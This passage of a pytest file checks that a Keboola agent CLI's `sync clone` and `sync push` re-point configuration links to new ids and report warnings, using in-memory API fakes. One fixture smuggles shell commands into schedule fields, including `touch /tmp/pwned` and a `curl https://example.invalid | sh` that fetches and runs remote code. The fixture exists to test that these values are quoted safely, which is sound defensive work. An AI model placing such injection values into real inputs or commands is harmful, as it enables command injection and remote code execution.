"""`sync clone` and `sync push` re-point links to the new ids and report the rest (CLI-24).

The reference tree is built by the real ``init_sync`` + ``pull`` from a stateful
Storage fake, then the real ``clone_project`` (or a plain ``push``) writes it
into an empty target fake. Before CLI-24 push re-pointed only flow task
``configId``s and variables links: shared code, legacy orchestrator tasks,
schedule targets and task ``configRowIds`` kept the reference ids, and the
clone still reported ``status: cloned`` with no warning.
"""

import copy
import itertools
import shlex
import shutil
from collections.abc import Callable
from pathlib import Path
from typing import Any, Self
from unittest.mock import MagicMock, patch

import pytest
import yaml
from typer.testing import CliRunner

from keboola_agent_cli.cli import app
from keboola_agent_cli.config_store import ConfigStore
from keboola_agent_cli.constants import CONFIG_FILENAME
from keboola_agent_cli.errors import ErrorCode, KeboolaApiError
from keboola_agent_cli.models import ProjectConfig, TokenVerifyResponse
from keboola_agent_cli.services._sync_bindings import (
    _resolve_shared_code_link,
    rewrite_shared_code_placeholders,
    task_config_ref,
)
from keboola_agent_cli.services.sync_service import SyncService
from keboola_agent_cli.sync.clone import drop_source_pull_marks
from keboola_agent_cli.sync.manifest import load_manifest, save_manifest

STACK = "https://connection.keboola.com"
REF_TOKEN = "901-11111-fakeReferenceTokenXXXXXXXXXXXX"
TGT_TOKEN = "902-22222-fakeTargetTokenXXXXXXXXXXXXXXX"
SOURCE_CIPHER = "KBC::ProjectSecure::SOURCE-PROJECT-BOUND-CIPHERTEXT"
TARGET_CIPHER_PREFIX = "KBC::ProjectSecure::TARGET-"

SQL = "keboola.snowflake-transformation"
PY = "keboola.python-transformation-v2"
VARS = "keboola.variables"
SHARED = "keboola.shared-code"
EXTRACTOR = "keboola.ex-db-mysql"
DATA_APP = "keboola.data-apps"
FLOW = "keboola.flow"
ORCH = "keboola.orchestrator"
SCHED = "keboola.scheduler"
SANDBOX = "keboola.sandboxes"

# Both shared-code configs use the same row id, so a row map keyed by the row
# id alone would point one of the transformations at the other one's row.
SHARED_ROW_ID = "shared-row"


def _config(
    config_id: str, name: str, configuration: dict[str, Any], rows: list | None = None
) -> dict[str, Any]:
    return {
        "id": config_id,
        "name": name,
        "description": "",
        "configuration": configuration,
        "rows": rows or [],
    }


def _row(row_id: str, name: str, configuration: dict[str, Any]) -> dict[str, Any]:
    return {"id": row_id, "name": name, "description": "", "configuration": configuration}


def _component(component_id: str, type_: str, *configs: dict[str, Any]) -> dict[str, Any]:
    return {"id": component_id, "type": type_, "configurations": list(configs)}


def _job_task(task_id: int, name: str, component_id: str, config_id: str) -> dict[str, Any]:
    return {
        "id": task_id,
        "name": name,
        "phase": 1,
        "enabled": True,
        "task": {"type": "job", "componentId": component_id, "configId": config_id, "mode": "run"},
    }


def _blocks(*codes: tuple[str, list[str]]) -> dict[str, Any]:
    return {
        "blocks": [
            {"name": "B1", "codes": [{"name": name, "script": script} for name, script in codes]}
        ]
    }


def _schedule(config_id: str, name: str, state: str = "enabled") -> dict[str, Any]:
    return _config(
        config_id,
        name,
        {
            "schedule": {"cronTab": "0 3 * * *", "timezone": "UTC", "state": state},
            "target": {"componentId": FLOW, "configurationId": "flow-ref", "mode": "run"},
        },
    )


def _reference_components() -> list[dict[str, Any]]:
    """A reference project whose configs link to each other in every way sync knows."""
    variables_links = {"variables_id": "var-ref", "variables_values_id": "vrow-ref"}
    values = [{"name": "limit", "value": "10"}, {"name": "#token", "value": SOURCE_CIPHER}]
    return [
        _component(
            VARS,
            "other",
            _config(
                "var-ref",
                "Variables",
                {"variables": [{"name": "limit", "type": "string"}]},
                rows=[_row("vrow-ref", "Default values", {"values": values})],
            ),
        ),
        _component(
            SHARED,
            "other",
            _config(
                "sc-py",
                "Shared python",
                {"componentId": PY},
                rows=[_row(SHARED_ROW_ID, "helpers", {"code_content": ["def helper():\n    1"]})],
            ),
            _config(
                "sc-sql",
                "Shared sql",
                {"componentId": SQL},
                rows=[_row(SHARED_ROW_ID, "prep", {"code_content": ["SELECT 0;"]})],
            ),
        ),
        _component(
            SQL,
            "transformation",
            _config(
                "tr1-ref",
                "SQL step",
                {
                    "parameters": _blocks(
                        ("Shared", [f"{{{{ {SHARED_ROW_ID} }}}}"]), ("C1", ["SELECT 1;"])
                    ),
                    "shared_code_id": "sc-sql",
                    "shared_code_row_ids": [SHARED_ROW_ID],
                    **variables_links,
                },
            ),
            _config(
                "tr3-ref",
                "SQL vars only",
                {"parameters": _blocks(("C1", ["SELECT {{limit}};"])), **variables_links},
            ),
        ),
        _component(
            PY,
            "transformation",
            _config(
                "tr2-ref",
                "Py step",
                {
                    "parameters": _blocks(
                        ("Shared helpers", [f"{{{{{SHARED_ROW_ID}}}}}"]),
                        ("Main", ["print(helper(), '{{limit}}')"]),
                    ),
                    "shared_code_id": "sc-py",
                    "shared_code_row_ids": [SHARED_ROW_ID],
                    **variables_links,
                },
            ),
        ),
        _component(
            EXTRACTOR,
            "extractor",
            _config(
                "ex-ref",
                "Orders [daily]",
                {
                    "parameters": {
                        "db": {"host": "db", "#password": SOURCE_CIPHER},
                        "legacy_token": SOURCE_CIPHER,
                        "#plain": "hunter2",
                    },
                    "authorization": {
                        "oauth_api": {"id": "123", "credentials": {"#data": SOURCE_CIPHER}}
                    },
                },
                rows=[
                    _row("exrow-1", "orders", {"parameters": {"table": "orders"}}),
                    _row("exrow-2", "items", {"parameters": {"table": "items"}}),
                ],
            ),
        ),
        _component(
            DATA_APP,
            "application",
            _config(
                "da-ref",
                "My app",
                {
                    "parameters": {
                        "id": "99999",
                        "dataApp": {"slug": "my-app", "secrets": {"#API_KEY": SOURCE_CIPHER}},
                    },
                },
            ),
        ),
        _component(
            FLOW,
            "other",
            _config(
                "flow-ref",
                "Template flow",
                {
                    "phases": [{"id": 1, "name": "Step 1", "next": []}],
                    "tasks": [
                        _job_task(10, "sql", SQL, "tr1-ref"),
                        _job_task(11, "py", PY, "tr2-ref"),
                        _job_task(12, "sandbox", SANDBOX, "sbx-ref"),
                        {
                            "id": 13,
                            "name": "notify",
                            "phase": 1,
                            "task": {"type": "notification", "recipients": []},
                        },
                        {
                            **_job_task(14, "orders", EXTRACTOR, "ex-ref"),
                            "task": {
                                "type": "job",
                                "componentId": EXTRACTOR,
                                "configId": "ex-ref",
                                "configRowIds": ["exrow-1"],
                                "mode": "run",
                            },
                        },
                    ],
                },
            ),
        ),
        _component(
            ORCH,
            "other",
            _config(
                "orch-ref",
                "Legacy orchestration",
                {
                    "phases": [{"id": 1, "name": "P1", "dependsOn": []}],
                    "tasks": [
                        {
                            "id": 20,
                            "name": "sql",
                            "phase": 1,
                            "task": {"componentId": SQL, "configId": "tr1-ref", "mode": "run"},
                        },
                        {
                            "id": 21,
                            "name": "inline",
                            "phase": 1,
                            "task": {"componentId": SQL, "configData": {}, "mode": "run"},
                        },
                    ],
                },
            ),
        ),
        _component(SCHED, "other", _schedule("sched-ref", "Nightly")),
        _component(
            SANDBOX,
            "other",
            _config("sbx-ref", "Workspace", {"parameters": {"id": "123"}}),
        ),
    ]


def _component_entry(components: list[dict[str, Any]], component_id: str) -> dict[str, Any]:
    return next(comp for comp in components if comp["id"] == component_id)


def _with_disabled_schedule(components: list[dict[str, Any]]) -> None:
    schedule = _component_entry(components, SCHED)["configurations"][0]
    schedule["configuration"]["schedule"]["state"] = "disabled"


def _with_hostile_schedule(components: list[dict[str, Any]]) -> None:
    schedule = _component_entry(components, SCHED)["configurations"][0]["configuration"]
    schedule["schedule"]["cronTab"] = "0 3 * * *'; touch /tmp/pwned; echo '"
    schedule["schedule"]["timezone"] = "UTC; curl https://example.invalid | sh"


def _with_second_schedule(components: list[dict[str, Any]]) -> None:
    _component_entry(components, SCHED)["configurations"].append(_schedule("sched-2", "Hourly"))


class StorageFake:
    """Stateful Storage API double: every created config or row gets a fresh id.

    ``fail_update_once`` holds ``(component_id, config name, change_description
    prefix)`` entries: the next matching PUT fails, once. A row whose name is in
    ``fail_row_names`` fails to create.
    """

    def __init__(self, components: list[dict[str, Any]], project_id: int):
        self.components = components
        self.project_id = project_id
        self._ids = itertools.count(1)
        self.create_calls: list[dict[str, Any]] = []
        self.fail_update_once: set[tuple[str, str, str]] = set()
        self.fail_row_names: set[str] = set()

    def find(self, component_id: str, config_id: str) -> dict[str, Any]:
        for config in self.configs_of(component_id):
            if str(config["id"]) == str(config_id):
                return config
        raise KeyError(f"{component_id}/{config_id}")

    def configs_of(self, component_id: str) -> list[dict[str, Any]]:
        for comp in self.components:
            if comp["id"] == component_id:
                return comp["configurations"]
        return []

    def append(self, component_id: str, config: dict[str, Any]) -> None:
        for comp in self.components:
            if comp["id"] == component_id:
                comp["configurations"].append(config)
                return
        self.components.append({"id": component_id, "type": "other", "configurations": [config]})

    def verify_token(self) -> TokenVerifyResponse:
        return TokenVerifyResponse(
            token_id="tok",
            token_description="fake",
            project_id=self.project_id,
            project_name=f"P{self.project_id}",
            owner_name="Org",
        )

    def list_dev_branches(self) -> list[dict[str, Any]]:
        return [{"id": self.project_id * 10, "name": "Main", "isDefault": True}]

    def list_components_with_configs(self, branch_id: int | None = None) -> list[dict[str, Any]]:
        return copy.deepcopy(self.components)

    def list_config_folder_metadata(self, branch_id: int | None = None) -> dict[str, str]:
        return {}

    def set_config_metadata(self, **kwargs: Any) -> None:
        return None

    def encrypt_values(self, project_id: Any, component_id: str, data: dict[str, str]) -> dict:
        return {key: f"{TARGET_CIPHER_PREFIX}{key}" for key in data}

    def get_config_detail(
        self, component_id: str, config_id: str, branch_id: int | None = None
    ) -> dict[str, Any]:
        return copy.deepcopy(self.find(component_id, config_id))

    def get_config_row(
        self, component_id: str, config_id: str, row_id: str, branch_id: int | None = None
    ) -> dict[str, Any]:
        for row in self.find(component_id, config_id)["rows"]:
            if str(row["id"]) == str(row_id):
                return copy.deepcopy(row)
        raise KeyError(row_id)

    def create_config(
        self,
        component_id: str,
        name: str,
        configuration: dict[str, Any],
        description: str = "",
        branch_id: int | None = None,
        is_disabled: bool = False,
    ) -> dict[str, Any]:
        config = _config(f"new-{next(self._ids)}", name, copy.deepcopy(configuration))
        self.create_calls.append({"component_id": component_id, "id": config["id"]})
        self.append(component_id, config)
        return copy.deepcopy(config)

    def update_config(
        self,
        component_id: str,
        config_id: str,
        name: str | None = None,
        configuration: dict[str, Any] | None = None,
        description: str | None = None,
        change_description: str = "",
        branch_id: int | None = None,
        is_disabled: bool | None = None,
    ) -> dict[str, Any]:
        config = self.find(component_id, config_id)
        for key in list(self.fail_update_once):
            fail_component, fail_name, fail_description = key
            if (fail_component, fail_name) == (
                component_id,
                config["name"],
            ) and change_description.startswith(fail_description):
                self.fail_update_once.discard(key)
                raise KeboolaApiError("Storage refused the update", status_code=500)
        if configuration is not None:
            config["configuration"] = copy.deepcopy(configuration)
        return copy.deepcopy(config)

    def create_config_row(
        self,
        component_id: str,
        config_id: str,
        name: str,
        configuration: dict[str, Any],
        description: str = "",
        is_disabled: bool = False,
        branch_id: int | None = None,
    ) -> dict[str, Any]:
        if name in self.fail_row_names:
            raise KeboolaApiError("Storage refused the row", status_code=500)
        row = _row(f"newrow-{next(self._ids)}", name, copy.deepcopy(configuration))
        self.find(component_id, config_id)["rows"].append(row)
        return copy.deepcopy(row)


class DataScienceFake:
    """Data Science double: ``create_app`` also creates the Storage config, like POST /apps."""

    def __init__(self, storage: StorageFake, apps: list[dict[str, Any]]):
        self.storage = storage
        self.apps = apps
        self.created_app_ids: list[str] = []

    def __enter__(self) -> Self:
        return self

    def __exit__(self, *args: object) -> bool:
        return False

    def close(self) -> None:
        return None

    def list_apps(self) -> list[dict[str, Any]]:
        return self.apps

    def create_app(
        self,
        *,
        type_: str,
        name: str,
        description: str,
        config: dict[str, Any],
        branch_id: int | None = None,
        use_managed_git_repo: bool = False,
    ) -> dict[str, Any]:
        app_id = f"8888{len(self.created_app_ids) + 1}"
        config_id = f"da-new-{len(self.created_app_ids) + 1}"
        self.created_app_ids.append(app_id)
        self.storage.append(DATA_APP, _config(config_id, name, copy.deepcopy(config)))
        return {"id": app_id, "configId": config_id}


def _wrap(obj: Any) -> MagicMock:
    mock = MagicMock(wraps=obj)
    mock.__enter__ = MagicMock(return_value=mock)
    mock.__exit__ = MagicMock(return_value=False)
    return mock


class World:
    """A pulled reference project and an empty target project, both faked."""

    def __init__(
        self,
        tmp_path: Path,
        config_dir: Path,
        *,
        reference: Callable[[list[dict[str, Any]]], None] | None = None,
    ):
        components = _reference_components()
        if reference is not None:
            reference(components)
        self.tmp_path = tmp_path
        self.ref_api = StorageFake(components, project_id=258)
        self.tgt_api = StorageFake([], project_id=4242)
        ref_ds = DataScienceFake(
            self.ref_api,
            apps=[
                {"id": "99999", "componentId": DATA_APP, "configId": "da-ref", "type": "python-js"}
            ],
        )
        self.tgt_ds = DataScienceFake(self.tgt_api, apps=[])
        ref_client, tgt_client = _wrap(self.ref_api), _wrap(self.tgt_api)

        store = ConfigStore(config_dir=config_dir)
        for alias, token, project_id in (("ref", REF_TOKEN, 258), ("target", TGT_TOKEN, 4242)):
            store.add_project(
                alias,
                ProjectConfig(
                    stack_url=STACK, token=token, project_name=alias, project_id=project_id
                ),
            )
        self.service = SyncService(
            config_store=store,
            client_factory=lambda url, token: ref_client if token == REF_TOKEN else tgt_client,
            ds_client_factory=lambda url, token: (
                _wrap(ref_ds) if token == REF_TOKEN else _wrap(self.tgt_ds)
            ),
        )
        self.ref_dir = tmp_path / "reference"
        self.ref_dir.mkdir(parents=True)
        self.service.init_sync(alias="ref", project_root=self.ref_dir)
        self.service.pull(alias="ref", project_root=self.ref_dir, no_storage=True, no_jobs=True)
        self.clone_dir = tmp_path / "clone"

    def clone(self, *, dry_run: bool = False, branch_override: int | None = None) -> dict[str, Any]:
        return self.service.clone_project(
            source=self.ref_dir,
            target_alias="target",
            target_dir=self.clone_dir,
            dry_run=dry_run,
            branch_override=branch_override,
        )

    def push_fresh_tree(self) -> dict[str, Any]:
        """Push the reference configs into the target with a plain `sync push`, no clone.

        The tree is initialised for the target, then the reference config files
        and their manifest entries (with the reference ids) are added to it.
        The entries lose the reference ``pull_hash``, as a hand-written entry
        has none: with one, the diff would report them as deleted on the
        target (``remote_deleted``, issue #792 H) instead of new.
        """
        tree = self.tmp_path / "fresh"
        tree.mkdir()
        self.service.init_sync(alias="target", project_root=tree)
        target_manifest = load_manifest(tree)
        ref_manifest = load_manifest(self.ref_dir)
        branch = target_manifest.branches[0]
        shutil.copytree(
            self.ref_dir / ref_manifest.branches[0].path, tree / branch.path, dirs_exist_ok=True
        )
        for cfg in ref_manifest.configurations:
            cfg.branch_id = branch.id
            target_manifest.configurations.append(cfg)
        drop_source_pull_marks(target_manifest)
        save_manifest(tree, target_manifest)
        return self.service.push(alias="target", project_root=tree)

    def target(self, component_id: str, name: str | None = None) -> dict[str, Any]:
        configs = [
            c for c in self.tgt_api.configs_of(component_id) if name is None or c["name"] == name
        ]
        assert len(configs) == 1, f"{component_id} {name}: {len(configs)} configs in the target"
        return configs[0]

    def local_dir(self, component_id: str, name: str | None = None) -> Path:
        for path in self.clone_dir.rglob(CONFIG_FILENAME):
            if "rows" in path.relative_to(self.clone_dir).parts:
                continue
            data = yaml.safe_load(path.read_text(encoding="utf-8"))
            if (data.get("_keboola") or {}).get("component_id") == component_id and (
                name is None or data.get("name") == name
            ):
                return path.parent
        raise AssertionError(f"no local {component_id} {name} config in the clone tree")

    def local_config(self, component_id: str, name: str | None = None) -> dict[str, Any]:
        path = self.local_dir(component_id, name) / CONFIG_FILENAME
        return yaml.safe_load(path.read_text(encoding="utf-8"))


def _warnings_of(result: dict[str, Any], change_type: str) -> list[dict[str, Any]]:
    return [w for w in result["warnings"] if w["change_type"] == change_type]


@pytest.fixture
def world(tmp_path: Path, tmp_config_dir: Path) -> World:
    return World(tmp_path, tmp_config_dir)


@pytest.fixture
def cloned(world: World) -> tuple[World, dict[str, Any]]:
    return world, world.clone()


# ---------------------------------------------------------------------------
# Links re-pointed by push (Phase C / Phase D)
# ---------------------------------------------------------------------------


def test_clone_reports_no_errors(cloned: tuple[World, dict[str, Any]]) -> None:
    _world, result = cloned
    assert result["status"] == "cloned"
    assert result["errors"] == []


def test_python_shared_code_points_at_its_new_config_and_row(
    cloned: tuple[World, dict[str, Any]],
) -> None:
    world, _result = cloned
    shared = world.target(SHARED, "Shared python")
    new_row_id = shared["rows"][0]["id"]
    configuration = world.target(PY)["configuration"]

    assert configuration["shared_code_id"] == shared["id"]
    assert configuration["shared_code_row_ids"] == [new_row_id]
    codes = configuration["parameters"]["blocks"][0]["codes"]
    assert codes[0]["script"] == [f"{{{{{new_row_id}}}}}"]
    # A variable placeholder is not a shared-code row: it stays as it is.
    assert codes[1]["script"] == ["print(helper(), '{{limit}}')"]
    # The variables pass ran on the same transformation too.
    assert configuration["variables_id"] == world.target(VARS)["id"]


def test_sql_shared_code_points_at_its_own_row(cloned: tuple[World, dict[str, Any]]) -> None:
    # Both shared-code configs use the row id SHARED_ROW_ID: each
    # transformation must get the row of its own shared-code config.
    world, _result = cloned
    shared = world.target(SHARED, "Shared sql")
    new_row_id = shared["rows"][0]["id"]
    assert new_row_id != world.target(SHARED, "Shared python")["rows"][0]["id"]
    configuration = world.target(SQL, "SQL step")["configuration"]

    assert configuration["shared_code_id"] == shared["id"]
    assert configuration["shared_code_row_ids"] == [new_row_id]
    codes = configuration["parameters"]["blocks"][0]["codes"]
    # The spaces inside the braces are kept.
    assert codes[0]["script"] == [f"{{{{ {new_row_id} }}}}"]
    script = (world.local_dir(SQL, "SQL step") / "transform.sql").read_text(encoding="utf-8")
    assert f"{{{{ {new_row_id} }}}}" in script
    assert SHARED_ROW_ID not in script


def test_shared_code_links_rewritten_in_local_files(cloned: tuple[World, dict[str, Any]]) -> None:
    world, _result = cloned
    shared = world.target(SHARED, "Shared python")
    new_row_id = shared["rows"][0]["id"]
    extra = world.local_config(PY)["_configuration_extra"]
    assert extra["shared_code_id"] == shared["id"]
    assert extra["shared_code_row_ids"] == [new_row_id]
    script = (world.local_dir(PY) / "transform.py").read_text(encoding="utf-8")
    assert f"{{{{{new_row_id}}}}}" in script
    assert SHARED_ROW_ID not in script


def test_orchestrator_task_points_at_target_config(cloned: tuple[World, dict[str, Any]]) -> None:
    world, _result = cloned
    new_sql_id = world.target(SQL, "SQL step")["id"]
    tasks = world.target(ORCH)["configuration"]["tasks"]
    assert tasks[0]["task"]["configId"] == new_sql_id
    assert "configId" not in tasks[1]["task"]
    local_tasks = world.local_config(ORCH)["_configuration_extra"]["tasks"]
    assert local_tasks[0]["task"]["configId"] == new_sql_id


def test_schedule_target_points_at_target_flow(cloned: tuple[World, dict[str, Any]]) -> None:
    world, _result = cloned
    new_flow_id = world.target(FLOW)["id"]
    assert world.target(SCHED)["configuration"]["target"]["configurationId"] == new_flow_id
    local_target = world.local_config(SCHED)["_configuration_extra"]["target"]
    assert local_target["configurationId"] == new_flow_id


def test_flow_task_config_row_ids_point_at_target_rows(
    cloned: tuple[World, dict[str, Any]],
) -> None:
    world, _result = cloned
    extractor = world.target(EXTRACTOR)
    orders_row_id = next(r["id"] for r in extractor["rows"] if r["name"] == "orders")
    task = next(t for t in world.target(FLOW)["configuration"]["tasks"] if t["id"] == 14)["task"]
    assert task["configId"] == extractor["id"]
    assert task["configRowIds"] == [orders_row_id]


def test_link_remaps_counts_each_kind(cloned: tuple[World, dict[str, Any]]) -> None:
    _world, result = cloned
    # flow_task_remaps keeps its meaning: flow tasks only (sql, py, orders).
    assert result["flow_task_remaps"] == 3
    assert result["link_remaps"] == {
        "flow_tasks": 3,
        "orchestrator_tasks": 1,
        "schedule_targets": 1,
        "shared_code": 2,
        "config_row_ids": 1,
    }


def test_rerun_after_rebinding_has_nothing_to_push(cloned: tuple[World, dict[str, Any]]) -> None:
    # Every rebind refreshed the manifest hashes, so the tree matches the target.
    world, _result = cloned
    rerun = world.clone()
    assert rerun["status"] == "no_changes"
    assert rerun["created"] == 0
    # The warnings came from the run that created the configs, not from this one.
    assert rerun["warnings"] == []


def test_plain_push_of_a_fresh_tree_repoints_links(world: World) -> None:
    result = world.push_fresh_tree()

    assert result["errors"] == []
    new_flow_id = world.target(FLOW)["id"]
    assert world.target(SCHED)["configuration"]["target"]["configurationId"] == new_flow_id
    new_sql_id = world.target(SQL, "SQL step")["id"]
    assert world.target(ORCH)["configuration"]["tasks"][0]["task"]["configId"] == new_sql_id
    shared = world.target(SHARED, "Shared python")
    assert world.target(PY)["configuration"]["shared_code_id"] == shared["id"]
    assert result["link_remaps"]["config_row_ids"] == 1


# ---------------------------------------------------------------------------
# Failure paths: every broken link is reported, and a failed PUT is retried
# ---------------------------------------------------------------------------


def _variables_link_ok(world: World) -> bool:
    configuration = world.target(SQL, "SQL vars only")["configuration"]
    return configuration["variables_id"] == world.target(VARS)["id"]


def _shared_code_link_ok(world: World) -> bool:
    shared_id = world.target(SHARED, "Shared python")["id"]
    return world.target(PY)["configuration"]["shared_code_id"] == shared_id


def _flow_task_link_ok(world: World) -> bool:
    task = world.target(FLOW)["configuration"]["tasks"][0]["task"]
    return task["configId"] == world.target(SQL, "SQL step")["id"]


def _orchestrator_task_link_ok(world: World) -> bool:
    task = world.target(ORCH)["configuration"]["tasks"][0]["task"]
    return task["configId"] == world.target(SQL, "SQL step")["id"]


def _schedule_target_link_ok(world: World) -> bool:
    target = world.target(SCHED)["configuration"]["target"]
    return target["configurationId"] == world.target(FLOW)["id"]


@pytest.mark.parametrize(
    ("component_id", "config_name", "description", "change_type", "link_ok"),
    [
        (SQL, "SQL vars only", "Resolve variables link", "variable_link", _variables_link_ok),
        (PY, "Py step", "Resolve shared code link", "shared_code_link", _shared_code_link_ok),
        (FLOW, "Template flow", "Remap linked", "flow_task_link", _flow_task_link_ok),
        (
            ORCH,
            "Legacy orchestration",
            "Remap linked",
            "flow_task_link",
            _orchestrator_task_link_ok,
        ),
        (SCHED, "Nightly", "Remap linked", "schedule_target_link", _schedule_target_link_ok),
    ],
)
def test_failed_link_put_is_retried_by_the_next_push(
    world: World,
    component_id: str,
    config_name: str,
    description: str,
    change_type: str,
    link_ok: Callable[[World], bool],
) -> None:
    world.tgt_api.fail_update_once.add((component_id, config_name, description))

    first = world.clone()
    [error] = first["errors"]
    assert (error["change_type"], error["component_id"]) == (change_type, component_id)
    assert "sync push` again" in error["message"]
    assert not link_ok(world)

    second = world.clone()
    assert second["errors"] == []
    assert link_ok(world)
    assert world.clone()["status"] == "no_changes"


def test_shared_code_row_that_was_not_created_is_an_error(
    tmp_path: Path, tmp_config_dir: Path
) -> None:
    world = World(tmp_path, tmp_config_dir)
    world.tgt_api.fail_row_names.add("helpers")
    result = world.clone()

    [error] = [e for e in result["errors"] if e["change_type"] == "shared_code_link"]
    assert error["component_id"] == PY
    assert error["error_code"] == ErrorCode.LINK_UNRESOLVED
    assert SHARED_ROW_ID in error["message"]


def test_task_config_row_that_was_not_created_is_an_error(
    tmp_path: Path, tmp_config_dir: Path
) -> None:
    world = World(tmp_path, tmp_config_dir)
    world.tgt_api.fail_row_names.add("orders")
    result = world.clone()

    [error] = [e for e in result["errors"] if e["change_type"] == "flow_task_link"]
    assert error["component_id"] == FLOW
    assert error["error_code"] == ErrorCode.LINK_UNRESOLVED
    assert "exrow-1" in error["message"]
    assert "'orders'" in error["message"]


# ---------------------------------------------------------------------------
# Warnings for what the target still needs
# ---------------------------------------------------------------------------


def test_warns_about_flow_task_that_runs_a_config_outside_the_tree(
    cloned: tuple[World, dict[str, Any]],
) -> None:
    world, result = cloned
    [warning] = _warnings_of(result, "missing_task_target")
    assert warning["component_id"] == FLOW
    assert warning["config_id"] == world.target(FLOW)["id"]
    assert (warning["task_id"], warning["task_name"]) == (12, "sandbox")
    assert (warning["target_component_id"], warning["target_config_id"]) == (SANDBOX, "sbx-ref")
    assert "'Template flow'" in warning["message"]
    assert "task 'sandbox'" in warning["message"]
    assert f"{SANDBOX}/sbx-ref" in warning["message"]


def test_warns_once_per_config_with_encrypted_values(
    cloned: tuple[World, dict[str, Any]],
) -> None:
    _world, result = cloned
    by_component = {w["component_id"]: w for w in _warnings_of(result, "encrypted_values_copied")}
    assert set(by_component) == {DATA_APP, VARS, EXTRACTOR}
    assert by_component[DATA_APP]["keys"] == ["parameters.dataApp.secrets.#API_KEY"]
    # A row's keys carry the row's path.
    assert by_component[VARS]["keys"] == ["rows/default-values: values.1.value"]
    for warning in by_component.values():
        assert SOURCE_CIPHER not in warning["message"]


def test_encrypted_values_get_advice_by_kind(cloned: tuple[World, dict[str, Any]]) -> None:
    _world, result = cloned
    [warning] = [
        w for w in _warnings_of(result, "encrypted_values_copied") if w["component_id"] == EXTRACTOR
    ]
    assert warning["secret_keys"] == ["parameters.db.#password"]
    assert warning["unencryptable_keys"] == ["parameters.legacy_token"]
    assert warning["oauth_keys"] == [
        "_configuration_extra.authorization.oauth_api.credentials.#data"
    ]
    assert "--secret PATH=VALUE" in warning["message"]
    assert (
        f"kbagent encrypt values --project target --component-id {EXTRACTOR}"
        in (warning["message"])
    )
    assert "kbagent config oauth-url" in warning["message"]


def test_plaintext_secret_in_the_reference_is_not_reported(
    cloned: tuple[World, dict[str, Any]],
) -> None:
    # Push encrypts the plaintext for the target and writes the ciphertext back
    # to the local file; that is not a value copied from the reference.
    world, result = cloned
    assert world.target(EXTRACTOR)["configuration"]["parameters"]["#plain"].startswith(
        TARGET_CIPHER_PREFIX
    )
    keys = [key for w in _warnings_of(result, "encrypted_values_copied") for key in w["keys"]]
    assert not any("#plain" in key for key in keys)


def test_warns_that_data_app_is_not_deployed(cloned: tuple[World, dict[str, Any]]) -> None:
    world, result = cloned
    [warning] = _warnings_of(result, "data_app_not_deployed")
    app_id = world.tgt_ds.created_app_ids[0]
    assert warning["app_id"] == app_id
    assert f"`kbagent data-app deploy --project target --app-id {app_id}`" in warning["message"]


def test_reports_schedule_as_not_active(cloned: tuple[World, dict[str, Any]]) -> None:
    world, result = cloned
    [warning] = _warnings_of(result, "schedule_not_active")
    assert warning["active"] is False
    assert warning["config_id"] == world.target(SCHED)["id"]
    flow_id = world.target(FLOW)["id"]
    assert f"--flow-id {flow_id} --cron '0 3 * * *' --timezone UTC`" in warning["message"]


def test_disabled_schedule_hint_keeps_it_disabled(tmp_path: Path, tmp_config_dir: Path) -> None:
    world = World(tmp_path, tmp_config_dir, reference=_with_disabled_schedule)
    [warning] = _warnings_of(world.clone(), "schedule_not_active")
    assert "--timezone UTC --disabled`" in warning["message"]


def test_schedule_hint_quotes_values_from_the_reference_tree(
    tmp_path: Path, tmp_config_dir: Path
) -> None:
    # The cron and the timezone come from the reference tree. The suggested
    # command must pass them as single arguments, never as extra shell commands.
    world = World(tmp_path, tmp_config_dir, reference=_with_hostile_schedule)
    [warning] = _warnings_of(world.clone(), "schedule_not_active")
    command = warning["message"].split("`")[1]
    flow_id = world.target(FLOW)["id"]
    assert shlex.split(command) == [
        "kbagent",
        "flow",
        "schedule",
        "--project",
        "target",
        "--flow-id",
        flow_id,
        "--cron",
        "0 3 * * *'; touch /tmp/pwned; echo '",
        "--timezone",
        "UTC; curl https://example.invalid | sh",
    ]


def test_two_schedules_on_one_flow_get_no_command(tmp_path: Path, tmp_config_dir: Path) -> None:
    # `flow schedule` updates the first schedule of a flow, so it could update
    # the wrong one: the warning points at the UI instead.
    world = World(tmp_path, tmp_config_dir, reference=_with_second_schedule)
    warnings = _warnings_of(world.clone(), "schedule_not_active")
    assert len(warnings) == 2
    for warning in warnings:
        assert "kbagent flow schedule --project" not in warning["message"]
        assert "Activate these schedules in the Keboola UI" in warning["message"]


def test_branch_clone_hints_carry_the_branch(tmp_path: Path, tmp_config_dir: Path) -> None:
    world = World(tmp_path, tmp_config_dir)
    result = world.clone(branch_override=777)
    [data_app] = _warnings_of(result, "data_app_not_deployed")
    [schedule] = _warnings_of(result, "schedule_not_active")
    assert data_app["message"].endswith(" --branch 777`.")
    assert " --timezone UTC --branch 777`" in schedule["message"]


def test_dry_run_reports_the_same_warnings_without_pushing(
    tmp_path: Path, tmp_config_dir: Path
) -> None:
    real = World(tmp_path / "real", tmp_config_dir / "real")
    real_result = real.clone()
    dry = World(tmp_path / "dry", tmp_config_dir / "dry")
    dry_result = dry.clone(dry_run=True)

    assert dry_result["status"] == "dry_run"
    assert dry.tgt_api.create_calls == []

    def kinds(result: dict[str, Any]) -> list[tuple[str, str, list[str]]]:
        # Push warnings (none here) only exist for the real run.
        return sorted(
            (w["change_type"], w["component_id"], w.get("keys", [])) for w in result["warnings"]
        )

    assert kinds(dry_result) == kinds(real_result)
    # The tree still carries the reference ids, so no command names an id.
    messages = " ".join(w["message"] for w in dry_result["warnings"])
    assert "--app-id" not in messages
    assert "--flow-id" not in messages


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("{{old}}", "{{new}}"),
        ("{{ old }}", "{{ new }}"),
        ("a\n{{old}}\nb {{old}}", "a\n{{new}}\nb {{new}}"),
        ("{{limit}}", "{{limit}}"),
        ("{{older}}", "{{older}}"),
    ],
)
def test_rewrite_shared_code_placeholders(text: str, expected: str) -> None:
    assert rewrite_shared_code_placeholders(text, {"old": "new"}) == expected


@pytest.mark.parametrize(
    ("component_id", "task", "expected"),
    [
        (FLOW, {"type": "job", "componentId": SQL, "configId": "1"}, (SQL, "1")),
        (FLOW, {"type": "notification", "componentId": SQL, "configId": "1"}, None),
        (FLOW, {"componentId": SQL, "configId": "1"}, None),
        (ORCH, {"componentId": SQL, "configId": 7}, (SQL, "7")),
        (ORCH, {"componentId": SQL, "configId": ""}, None),
        (ORCH, {"componentId": SQL, "configData": {}}, None),
    ],
)
def test_task_config_ref(
    component_id: str, task: dict[str, Any], expected: tuple[str, str] | None
) -> None:
